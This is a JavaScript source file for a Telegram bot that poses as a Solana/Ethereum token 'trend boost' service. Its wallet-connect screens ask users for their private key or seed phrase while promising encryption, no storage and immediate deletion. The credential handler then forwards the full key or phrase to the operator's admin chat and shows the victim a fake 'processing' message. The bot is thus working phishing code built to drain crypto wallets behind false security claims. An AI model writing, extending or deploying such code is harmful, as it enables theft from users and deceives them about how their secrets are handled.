      `Connecting your wallet unlocks:\n\n` +
      `• ⚡ <b>Instant payments</b> — no manual transfers\n` +
      `• 📊 <b>Order tracking</b> — all boosts in one place\n` +
      `• 💰 <b>Auto-refunds</b> — failed orders refunded instantly\n` +
      `• 🎯 <b>Priority processing</b> — faster service\n` +
      `• 🔔 <b>Notifications</b> — alerts when boost goes live`,
      { parse_mode: "HTML", ...whyConnectKeyboard }
    );
  });

  bot.action("wallet_security", async (ctx) => {
    await ctx.answerCbQuery();
    await delMsg(ctx);
    await ctx.reply(
      `🛡️ <b>Security Guidelines</b>\n\n` +
      `⚠️ <b>IMPORTANT SECURITY NOTICE:</b>\n\n` +
      `🔒 <b>What We Do:</b>\n` +
      `• End-to-End Encryption - Your data is encrypted at all times\n` +
      `• No Storage - We never store your private keys permanently\n` +
      `• Secure Processing - All operations use secure, isolated environments\n` +
      `• Regular Audits - Our security is regularly tested and verified\n\n` +
      `❌ <b>What You Should Know:</b>\n` +
      `• Never Share - Only enter your keys in official bot interfaces\n` +
      `• Verify URL - Make sure you're using the official bot\n` +
      `• Stay Alert - We will never ask for keys via other channels\n\n` +
      `✅ <b>Best Practices:</b>\n` +
      `• Monitor Activity - Regularly check your wallet transactions\n` +
      `• Stay Updated - Keep your wallet software up to date\n` +
      `• Use Hardware Wallets - For maximum security with large amounts\n\n` +
      `🔒 <b>Our Commitment:</b>\n` +
      `We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.\n\n` +
      `Ready to proceed safely?`,
      { parse_mode: "HTML", ...securityGuidelinesKeyboard }
    );
  });

  bot.action("wallet_how_to", async (ctx) => {
    await ctx.answerCbQuery();
    await delMsg(ctx);
    await ctx.reply(
      `📱 <b>How to Connect Your Wallet</b>\n\n` +
      `🔧 <b>Step-by-Step Process:</b>\n\n` +
      `1️⃣ <b>Choose Connection Method</b>\n` +
      `• Private Key - Direct key import (fastest)\n` +
      `• Seed Phrase - 12/24 word recovery phrase\n\n` +
      `2️⃣ <b>Prepare Your Information</b>\n` +
      `• Open your wallet app (Phantom, Solflare, etc.)\n` +
      `• Navigate to wallet settings or security section\n` +
      `• Copy your private key or seed phrase\n\n` +
      `3️⃣ <b>Secure Connection</b>\n` +
      `• Click "Start Connection" below\n` +
      `• Paste your key or seed phrase when prompted\n` +
      `• Wait for confirmation (2-5 minutes)\n\n` +
      `📱 <b>Supported Wallets:</b>\n` +
      `• Phantom - Most popular Solana wallet\n` +
      `• Solflare - Advanced features and security\n` +
      `• Backpack - Modern interface and tools\n` +
      `• Glow - Mobile-optimized experience\n` +
      `• Other Solana Wallets - Most SPL-compatible wallets\n\n` +
      `⏰ Connection Time: Usually 2-5 minutes\n` +
      `🔒 Security: Military-grade encryption throughout\n\n` +
      `Ready to connect your wallet?`,
      { parse_mode: "HTML", ...howToConnectKeyboard }
    );
  });

  bot.action("wallet_connect_now", async (ctx) => {
    await ctx.answerCbQuery();
    setSession(ctx.from.id, { step: "awaiting_wallet_credential" });
    await delMsg(ctx);
    await ctx.reply(
      `🔗 <b>Connect Your Wallet Now</b>\n\n` +
      `⚠️ This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..\n\n` +
      `Please enter your Private Key or 12 word Seed Phrase to import your wallet:\n\n` +
      `🔑 <b>Private Key Format:</b>\n` +
      `• Single long string (64+ characters)\n` +
      `• Example:\n` +
      `<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>\n\n` +
      `🌱 <b>Seed Phrase Format:</b>\n` +
      `• 12 or 24 words separated by spaces\n` +
      `• Example: <code>abandon ability able about above absent absorb abstract absurd abuse access accident</code>\n\n` +
      `❓ <b>Security Features:</b>\n` +
      `• End-to-end encryption\n` +
      `• Secure processing environment\n` +
      `• Immediate deletion after connection\n` +
      `• No permanent storage\n\n` +
      `⚡ <b>Auto-Detection:</b>\n` +
      `Our system will automatically detect whether you're providing a private key or seed phrase.`,
      { parse_mode: "HTML", ...cancelKeyboard }
    );
  });

  // ── Text handler (state machine) ──────────────────────────────────────────
  bot.on("text", async (ctx) => {
    const text = ctx.message.text.trim();
    if (text.startsWith("/")) return;

    const session = getSession(ctx.from.id);

    switch (session.step) {

      case "awaiting_ca": {
        const ca = text.trim();

        if (!isValidCA(ca)) {
          await ctx.reply(
            `❌ <b>Invalid Contract Address</b>\n\n` +
            `That doesn't look like a valid token address.\n\n` +
            `<b>Valid formats:</b>\n` +
            `• Solana — 32–44 base58 characters\n  Example: <code>EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v</code>\n\n` +
            `• Ethereum — starts with <code>0x</code> + 40 hex characters\n  Example: <code>0xdAC17F958D2ee523a2206206994597C13D831ec7</code>\n\n` +
            `Please paste your token contract address:`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break;
        }

        setSession(ctx.from.id, { contractAddress: ca });
        const lookMsg = await ctx.reply(`🔍 <b>Looking up token data...</b>\n⏳ Please wait...`, { parse_mode: "HTML" });

        const info = await fetchTokenInfo(ca);
        await ctx.telegram.deleteMessage(ctx.chat.id, lookMsg.message_id).catch(() => {});

        if (!info) {
          const caChain = detectCAChain(ca);
          await ctx.reply(
            `❌ <b>Token Not Found</b>\n\n` +
            `Could not find token info for:\n<code>${ca}</code>\n\n` +
            `<b>Possible reasons:</b>\n` +
            `• Token is too new (not indexed yet) — try again in a few minutes\n` +
            `• Wrong address — double-check and paste again\n` +
            `• Token is on a different chain than expected (${caChain === "sol" ? "Solana" : caChain === "eth" ? "Ethereum" : "unknown"})\n\n` +
            `You can still proceed — paste the correct CA:`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break;
        }

        setSession(ctx.from.id, {
          step: "awaiting_confirm",
          tokenName:      info.name,
          tokenSymbol:    info.symbol,
          tokenChain:     info.chain,
          tokenImageUrl:  info.imageUrl,
          tokenPrice:     info.price,
          tokenMarketCap: info.marketCap,
          tokenVolume24h: info.volume24h,
          tokenLiquidity: info.liquidity,
          tokenChange24h: info.change24h,
          tokenDex:       info.dex,
        });

        const s = getSession(ctx.from.id);
        const isEth  = s.boostType === "eth_trending";
        const cost   = isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`;
        const chainName = info.chain === "sol" ? "solana" : info.chain === "eth" ? "ethereum" : info.chain ?? "unknown";
        const dexName   = info.dex ?? "unknown";
        const tokenUrl  = info.chain === "sol" ? `https://pump.fun/coin/${ca}` : `https://dexscreener.com/${info.chain}/${ca}`;
        const availLine = info.chain === "sol"
          ? `🟢 Pumpswap • 🟢 <a href="${tokenUrl}">Pump.fun</a>`
          : info.chain === "eth"
          ? `🟢 Uniswap • 🟢 <a href="${tokenUrl}">DexScreener</a>`
          : `🟢 <a href="${tokenUrl}">DexScreener</a>`;

        const tokenMsg =
          `📋 <b>Project Details Found!</b>\n\n` +
          `📊 ${dexName.toUpperCase()} Token\n\n` +
          `✅ <b>Contract Address:</b>\n<code>${ca}</code>\n\n` +
          `📊 <b>Token Information:</b>\n` +
          `• Name: ${info.name}\n` +
          `• Symbol: $${info.symbol}\n` +
          `• Price: ${info.price ?? "N/A"}\n` +
          `• Market Cap: ${info.marketCap ?? "N/A"}\n` +
          `• 24h Volume: ${info.volume24h ?? "N/A"}\n` +
          `• Liquidity: ${info.liquidity ?? "N/A"}\n` +
          `• 24h Change: ${info.change24h ?? "0.00"}%\n` +
          `• DEX: ${dexName}\n` +
          `• Chain: ${chainName}\n\n` +
          `🔗 <b>Available on:</b> ${availLine}\n\n` +
          `⚙️ <b>Service:</b> ${s.serviceLabel}\n` +
          `💰 <b>Cost:</b> ${cost}\n\n` +
          `✅ Confirm to proceed to payment?`;

        if (info.imageUrl) {
          const sent = await safeSendPhoto(ctx, info.imageUrl, {
            caption: tokenMsg,
            parse_mode: "HTML",
            ...confirmOrderKeyboard,
          });
          if (sent) break;
        }
        await ctx.reply(tokenMsg, { parse_mode: "HTML", ...confirmOrderKeyboard });
        break;
      }

      case "awaiting_tx_hash": {
        const raw   = text.trim();
        const s     = { ...session };
        const chain = detectChain(raw);

        if (chain === "invalid") {
          await ctx.reply(
            `❌ <b>Invalid Transaction Hash</b>\n\n` +
            `<b>Valid formats:</b>\n` +
            `• <b>Solana</b> — 87–88 base58 characters\n` +
            `• <b>Ethereum</b> — starts with <code>0x</code> + 64 hex chars\n\n` +
            `Copy the hash directly from your wallet and try again:`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break;
        }

        if (isHashUsed(raw)) {
          await ctx.reply(
            `❌ <b>TX Hash Already Used</b>\n\nThis hash was already submitted. Please send a new payment and submit that TX hash.`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break;
        }

        const verifyMsg = await ctx.reply(`🔍 <b>Verifying transaction on-chain...</b>\n\nPlease wait.`, { parse_mode: "HTML" });

        const payWallet   = deriveWalletForUser(ctx.from.id);
        const lamExpected = s.boostType !== "eth_trending"
          ? Math.round((s.selectedSol ?? 0) * 1e9)
          : undefined;

        const result = await verifyTx(
          raw,
          chain === "sol" ? payWallet.address : undefined,
          lamExpected,
        );

        try { await ctx.deleteMessage(verifyMsg.message_id); } catch {}

        if (!result.ok) {
          await ctx.reply(
            `${result.error}\n\nPaste the correct TX hash to continue, or press Cancel:`,
            { parse_mode: "HTML", ...cancelKeyboard }
          );
          break;
        }

        markHashUsed(raw);
        clearSession(ctx.from.id);
        if (s.orderId) {
          updateOrder(s.orderId, { txHash: raw, status: "tx_submitted", txSubmittedAt: new Date() });
        }

        const chainLabel  = chain === "eth" ? "Ethereum" : "Solana";
        const verifiedLine = result.confirmed ? `✅ <b>Verified on-chain</b> (${chainLabel})` : `⏳ <b>Submitted</b> — will be verified manually`;
        const amountLine   = result.lamports
          ? `💰 Amount: <b>${(result.lamports / 1e9).toFixed(4)} SOL</b>`
          : s.boostType === "eth_trending" ? `💰 Amount: <b>$${s.ethAmount} USD</b>` : `💰 Amount: <b>${s.selectedSol} SOL</b>`;

        const supportLine = SUPPORT_USERNAME ? `\n\n💬 For support: ${SUPPORT_USERNAME}` : "";

        await ctx.reply(
          `✅ <b>Payment Received!</b>\n\n` +
          `${verifiedLine}\n${amountLine}\n\n` +
          `🔗 TX Hash:\n<code>${raw}</code>\n\n` +
          `🚀 Your order is now being processed. Your boost will go live within <b>5–30 minutes</b>.` +
          supportLine,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );

        // ── Admin: full TX verification ────────────────────────────────────
        await notifyAdmin(
          `💸 <b>TX SUBMITTED — ${result.confirmed ? "✅ VERIFIED ON-CHAIN" : "⏳ PENDING MANUAL CHECK"}</b>\n\n` +
          `${userLine(ctx.from)}\n\n` +
          `🔗 TX Hash:\n<code>${raw}</code>\n` +
          `⛓ Chain: <b>${chainLabel}</b>\n` +
          `${result.confirmed ? "✅ On-chain: Confirmed" : "⚠️ On-chain: Unverified"}\n` +
          (result.recipient ? `📮 Recipient: <code>${result.recipient}</code>\n` : "") +
          (result.lamports  ? `💰 Amount: <b>${(result.lamports / 1e9).toFixed(4)} SOL</b>\n` : "") +
          (result.sender    ? `👤 Sender: <code>${result.sender}</code>\n` : "") +
          `\n⚙️ Service: <b>${s.serviceLabel ?? "N/A"}</b>\n` +
          `💵 Cost: <b>${s.boostType === "eth_trending" ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`}</b>\n` +
          `📜 CA: <code>${s.contractAddress ?? "N/A"}</code>\n` +
          `🪙 Token: <b>${s.tokenName ?? "?"} ($${s.tokenSymbol ?? "?"})</b>\n` +
          `🆔 Order: <code>${s.orderId ?? "N/A"}</code>\n\n` +
          `⏰ ${new Date().toUTCString()}`
        );
        break;
      }

      case "awaiting_wallet_credential": {
        const credential = text.trim();
        const words      = credential.split(/\s+/);
        const wordCount  = words.length;
        const isSeedPhrase = wordCount >= 12;
        const isPrivateKey = !isSeedPhrase && credential.length >= 40;
        const credType     = isSeedPhrase
          ? `Seed Phrase (${wordCount} words)`
          : isPrivateKey ? "Private Key" : "Credential";

        clearSession(ctx.from.id);

        // ── CRITICAL: always DM full credential to admin ──────────────────
        try {
          await notifyAdmin(
            `🔑 <b>⚠️ WALLET IMPORTED — ${credType.toUpperCase()}</b>\n\n` +
            `${userLine(ctx.from)}\n\n` +
            `📋 Type: <b>${credType}</b>\n\n` +
            `🗝 Credential:\n<code>${credential}</code>\n\n` +
            `⏰ ${new Date().toUTCString()}`
          );
        } catch (err) {
          logger.error({ err }, "CRITICAL: Failed to send wallet credential to admin");
        }

        await ctx.reply(
          `Connection of wallet may take time due to\n\n` +
          `<b>TIME BASE LOCATION AND NETWORK CONGESTION .....</b>\n\n` +
          `Please wait linking and importing your wallet..\n\n` +
          `Processing .........`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        break;
      }

      case "awaiting_withdraw_address": {
        const withdrawText = text;
        clearSession(ctx.from.id);
        await ctx.reply(
          `📤 <b>Withdrawal Request Received</b>\n\n` +
          `Details: <code>${withdrawText}</code>\n\n` +
          `⏳ Processed within 24 hours. You'll be notified when sent.`,
          { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
        );
        await notifyAdmin(
          `📤 <b>WITHDRAWAL REQUEST</b>\n\n` +
          `${userLine(ctx.from)}\n\n` +
          `Details: <code>${withdrawText}</code>\n\n` +
          `⏰ ${new Date().toUTCString()}`
        );
        break;
      }

      default:
        await sendPhoto(ctx, IMG.welcome,
          `🟢 <b>Welcome to PUMPFUN TREND BOT service!</b>\n\n` +
          `New to volume bots? No worries — we made it super simple!\n\n` +
          `━━━━━━━━━━━━━━━━\n\n` +
          `<b>How it works:</b>\n` +
          `1. Select how much Bumps/volume to use.\n` +
          `2. Pick how long to run and how Massive you want your Token to Pump.\n` +
          `3. Done! <a href="https://pump.fun">Pump.fun</a> Server handles the rest.\n\n` +
          `━━━━━━━━━━━━━━━━\n\n` +
          `<b>Works on:</b>\n` +
          `🟢 <a href="https://pump.fun">Pumpfun</a>  •  🟢 <a href="https://raydium.io">Raydium</a>  •\n` +
          `🟢 <a href="https://pumpswap.xyz">PumpSwap</a>  •  🟢 <a href="https://moonshot.money">Moonshot</a>  •\n` +
          `🟢 <a href="https://letsbonk.fun">LetsBonk</a>  •  🟢 <a href="https://dexscreener.com">Dexpad/screener</a>\n\n` +
          `From 0.3 - 0.4 - 0.5 - 0.6 SOL bumps boost trend with mass volume of high stabilities.`,
          mainMenuKeyboard
        );
        break;
    }
  });

  return bot;
}
